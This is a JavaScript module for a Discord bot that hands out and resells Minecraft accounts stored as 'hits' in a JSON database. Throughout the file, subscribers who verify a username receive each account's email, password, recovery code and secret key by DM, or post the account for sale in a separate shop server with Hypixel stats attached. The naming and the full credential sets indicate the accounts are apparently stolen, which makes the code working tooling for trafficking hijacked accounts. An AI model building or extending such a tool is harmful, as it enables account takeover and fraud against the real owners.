const { EmbedBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const fs = require('fs');
const path = require('path');

const dbPath = path.join(process.cwd(), 'database.json');

// Helper to pull data strictly from the JSON file
function getAccountData(accountId) {
  if (!fs.existsSync(dbPath)) return null;
  const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
  return db.hits[accountId] || null;
}

class AccountManager {
  static async handleClaimButton(interaction, client) {
    try {
      const messageId = interaction.message.id;
      const accountId = interaction.customId.split('_')[1]; // Extracts accountId cleanly

      // Verify the data exists in our JSON database first
      const accountData = getAccountData(accountId);
      if (!accountData) {
        return interaction.reply({ content: '❌ Account data expired or not found in database!', ephemeral: true });
      }

      // Check subscription
      const subscription = await client.db.getSubscription(interaction.user.id);
      if (!subscription) {
        return interaction.reply({ content: '❌ You need an active subscription to claim accounts!', ephemeral: true });
      }

      const modal = new ModalBuilder()
        .setCustomId(`verify_${accountId}_${messageId}`)
        .setTitle('Verify Username')
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('username_input')
              .setLabel('Enter the correct username')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          )
        );

      await interaction.showModal(modal);
    } catch (error) {
      console.error(error);
    }
  }

  static async handleVerifyModal(interaction, client) {
    try {
      // Defer reply because fetching Mojang & Hypixel APIs might take a few seconds
      await interaction.deferReply({ ephemeral: true });

      const parts = interaction.customId.split('_');
      const accountId = parts[1];
      const messageId = parts[2];

      const enteredUsername = interaction.fields.getTextInputValue('username_input').trim();
      const accountData = getAccountData(accountId);

      // Verify against the JSON DB, bypassing the Discord embed text completely
      if (!accountData || enteredUsername !== accountData.Username) {
        await client.db.addLog('claim_failed', interaction.user.id, `Wrong username for account ${accountId}`);
        return interaction.editReply({ content: '❌ Not that fast pooky, verification mismatch.' });
      }

      const channel = interaction.channel;
      const message = await channel.messages.fetch(messageId);
      const embed = message.embeds[0];

      // --- HYPIXEL STATS FETCH ---
      let bedwarsStars = 'N/A';
      let skywarsStars = 'N/A';
      const displayRank = accountData.Rank || accountData['Owns MC'] || 'N/A';
      
      try {
        const mojangRes = await fetch(`https://api.mojang.com/users/profiles/minecraft/${accountData.Username}`);
        if (mojangRes.ok) {
          const mojangData = await mojangRes.json();
          const hypixelRes = await fetch(`https://api.hypixel.net/v2/player?key=${process.env.HYPIXEL_API_KEY}&uuid=${mojangData.id}`);
          if (hypixelRes.ok) {
            const hypixelData = await hypixelRes.json();
            if (hypixelData.player) {
              bedwarsStars = hypixelData.player.achievements?.bedwars_level || 0;
              skywarsStars = hypixelData.player.achievements?.skywars_you_re_a_star || 0;
            }
          }
        }
      } catch (e) {
        console.error('Hypixel Profile Lookup Error:', e);
      }

      const thread = await channel.threads.create({
        name: `ticket-${interaction.user.username}`,
        type: ChannelType.PrivateThread,
        invitable: false,
        reason: 'Account claim/sell decision routing process'
      });

      await thread.members.add(interaction.user.id);

      // Show the fetched stats inside the decision embed
      const decisionEmbed = new EmbedBuilder()
        .setColor('#8B0000')
        .setTitle('Verification Successful')
        .setThumbnail(`https://mc-heads.net/avatar/${accountData.Username}`)
        .setDescription('Username verified! Here is the account breakdown. Would you like to **Claim** this account directly to your DMs, or **Sell** it in the shop?')
        .addFields(
          { name: 'Username', value: `\`\`\`${accountData.Username}\`\`\``, inline: true },
          { name: 'Rank', value: `\`\`\`${displayRank}\`\`\``, inline: true },
          { name: 'Capes', value: `\`\`\`${accountData.Capes || 'N/A'}\`\`\``, inline: true },
          { name: 'Bedwars Stars', value: `\`\`\`${bedwarsStars}\`\`\``, inline: true },
          { name: 'Skywars Stars', value: `\`\`\`${skywarsStars}\`\`\``, inline: true }
        );

      const actionRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`decision_claim_${accountId}_${messageId}`)
          .setLabel('Claim Account')
          .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
          .setCustomId(`decision_sell_${accountId}_${messageId}`)
          .setLabel('Sell Account')
          .setStyle(ButtonStyle.Danger)
      );

      await thread.send({ content: `<@${interaction.user.id}>`, embeds: [decisionEmbed], components: [actionRow] });

      const pendingEmbed = EmbedBuilder.from(embed)
        .setColor('#000000')
        .addFields({ name: 'Status', value: `Pending choice processing by ${interaction.user}` });

      const disabledButtons = message.components.map(row =>
        new ActionRowBuilder().addComponents(...row.components.map(button => ButtonBuilder.from(button).setDisabled(true)))
      );

      await message.edit({ embeds: [pendingEmbed], components: disabledButtons });
      await interaction.editReply({ content: `✅ Verified! Please navigate to your dedicated thread to complete the process: <#${thread.id}>` });

    } catch (error) {
      console.error(error);
      if (interaction.deferred) {
        await interaction.editReply({ content: '❌ An error occurred during verification!' });
      } else {
        await interaction.reply({ content: '❌ An error occurred during verification!', ephemeral: true });
      }
    }
  }

  static async handleDecisionButton(interaction, client) {
    try {
      const parts = interaction.customId.split('_');
      const action = parts[1]; // 'claim' or 'sell'
      const accountId = parts[2];
      const messageId = parts[3];

      const accountData = getAccountData(accountId);
      if (!accountData) return interaction.reply({ content: '❌ Database payload missing.', ephemeral: true });

      const parentChannel = interaction.channel.parent;
      const message = await parentChannel.messages.fetch(messageId);
      const embed = message.embeds[0];

      if (action === 'claim') {
        const emailSafe = accountData['Primary Email'] && accountData['Primary Email'] !== 'Hidden' 
          ? accountData['Primary Email'] 
          : (accountData['Email'] || 'N/A');

        const dmEmbed = new EmbedBuilder()
          .setColor('#8B0000')
          .setTitle('✅ Your Claimed Account Data')
          .addFields(
            { name: 'Username', value: `\`\`\`${accountData.Username || 'N/A'}\`\`\`` },
            { name: 'Email', value: `\`\`\`${emailSafe}\`\`\`` },
            { name: 'Recovery Code', value: `\`\`\`${accountData['Recovery Code'] || 'N/A'}\`\`\`` },
            { name: 'Password', value: `\`\`\`${accountData.Password || 'N/A'}\`\`\`` },
            { name: 'Secret Key', value: `\`\`\`${accountData['Secret Key'] || 'N/A'}\`\`\`` }
          )
          .setTimestamp();

        await interaction.user.send({ embeds: [dmEmbed] }).catch(() => {
           return interaction.reply({ content: '❌ I could not DM you! Please unlock your settings privacy controls.', ephemeral: true });
        });

        // Use the original database system for logging the user's action
        await client.db.claimAccount(
          accountId, interaction.user.id, accountData.Username, emailSafe,
          accountData['Recovery Code'], accountData.Password, accountData['Secret Key'],
          accountData.Rank, accountData.Capes, messageId
        );
        await client.db.updateAccountsClaimed(interaction.user.id);
        await client.db.addLog('account_claimed', interaction.user.id, `Account: ${accountData.Username}`);

        const updatedEmbed = EmbedBuilder.from(embed);
        if (updatedEmbed.data.fields.length > 8) updatedEmbed.spliceFields(-1, 1);
        updatedEmbed.addFields({ name: 'Claimed By', value: `${interaction.user}` });

        await message.edit({ embeds: [updatedEmbed] });
        await interaction.reply({ content: '✅ Sensitive account details cleanly routed to your DMs!', ephemeral: true });
        
        await interaction.channel.setLocked(true);
        await interaction.channel.setArchived(true);

      } else if (action === 'sell') {
        const modal = new ModalBuilder()
          .setCustomId(`sellprice_${accountId}_${messageId}`)
          .setTitle('Set Account Price')
          .addComponents(
            new ActionRowBuilder().addComponents(
              new TextInputBuilder()
                .setCustomId('price_input')
                .setLabel('Enter price value amount (e.g. 15)')
                .setStyle(TextInputStyle.Short)
                .setRequired(true)
            )
          );

        await interaction.showModal(modal);
      }
    } catch (error) {
      console.error(error);
    }
  }

  static async handleSellPriceModal(interaction, client) {
    try {
      await interaction.deferReply({ ephemeral: true });
      const parts = interaction.customId.split('_');
      const accountId = parts[1];
      const messageId = parts[2];
      const price = interaction.fields.getTextInputValue('price_input').trim();

      const accountData = getAccountData(accountId);
      if (!accountData) return interaction.editReply({ content: '❌ Database payload missing.' });

      const parentChannel = interaction.channel.parent;
      const message = await parentChannel.messages.fetch(messageId);
      const embed = message.embeds[0];

      let bedwarsStars = 'N/A';
      let skywarsStars = 'N/A';
      
      try {
        const mojangRes = await fetch(`https://api.mojang.com/users/profiles/minecraft/${accountData.Username}`);
        if (mojangRes.ok) {
          const mojangData = await mojangRes.json();
          const hypixelRes = await fetch(`https://api.hypixel.net/v2/player?key=${process.env.HYPIXEL_API_KEY}&uuid=${mojangData.id}`);
          if (hypixelRes.ok) {
            const hypixelData = await hypixelRes.json();
            if (hypixelData.player) {
              bedwarsStars = hypixelData.player.achievements?.bedwars_level || 0;
              skywarsStars = hypixelData.player.achievements?.skywars_you_re_a_star || 0;
            }
          }
        }
      } catch (e) {
        console.error('Hypixel Profile Lookup Error:', e);
      }

      const targetChannelName = `${price}💲・${accountData.Username}`;

      // --- NEW LOGIC: Fetch the Shop Server specifically ---
      const shopGuildId = process.env.SHOP_GUILD_ID;
      
      if (!shopGuildId) {
        return interaction.editReply({ content: '❌ Configuration error: SHOP_GUILD_ID is not set in the .env file.' });
      }

      const shopGuild = client.guilds.cache.get(shopGuildId) || await client.guilds.fetch(shopGuildId).catch(() => null);

      if (!shopGuild) {
        return interaction.editReply({ content: '❌ Could not locate the Shop Server! Please check the SHOP_GUILD_ID in your .env file and ensure the bot is in that server.' });
      }

      // Create the channel in the remote Shop Server
      const shopChannel = await shopGuild.channels.create({
        name: targetChannelName,
        type: ChannelType.GuildText,
        parent: process.env.SHOP_CATEGORY_ID, // Ensure this Category ID is from the Shop Server
        topic: `Premium listing registered by user: ${interaction.user.tag}`
      });

      const listingEmbed = new EmbedBuilder()
        .setColor('#8B0000')
        .setTitle('New Account Listed')
        .setThumbnail(`https://mc-heads.net/body/${accountData.Username}`)
        .addFields(
          { name: 'Username', value: `\`\`\`${accountData.Username || 'N/A'}\`\`\`` },
          { name: 'Price', value: `\`\`\`$${price}\`\`\`` },
          { name: 'Capes', value: `\`\`\`${accountData.Capes || 'N/A'}\`\`\`` },
          { name: 'Rank', value: `\`\`\`${accountData.Rank || accountData['Owns MC'] || 'N/A'}\`\`\`` },
          { name: 'Networth', value: `\`\`\`N/A\`\`\`` },
          { name: 'Bedwars stars', value: `\`\`\`${bedwarsStars}\`\`\`` },
          { name: 'Skywars stars', value: `\`\`\`${skywarsStars}\`\`\`` }
        )
        .setFooter({ text: `Merchant Broker ID: ${interaction.user.tag}` })
        .setTimestamp();

      await shopChannel.send({ embeds: [listingEmbed] });

      const updatedEmbed = EmbedBuilder.from(embed);
      if (updatedEmbed.data.fields.length > 8) updatedEmbed.spliceFields(-1, 1);
      updatedEmbed.addFields({ name: 'Status', value: `Listed inside store marketplace: ${shopChannel}` });
      
      await message.edit({ embeds: [updatedEmbed] });
      await interaction.editReply({ content: `✅ Successfully deployed store directory hook listing at ${shopChannel} (in the Shop Server)!` });

      await interaction.channel.setLocked(true);
      await interaction.channel.setArchived(true);

    } catch (error) {
      console.error(error);
      await interaction.editReply({ content: '❌ Structural environment configurations encountered errors generating listing items.' });
    }
  }
}

module.exports = AccountManager;
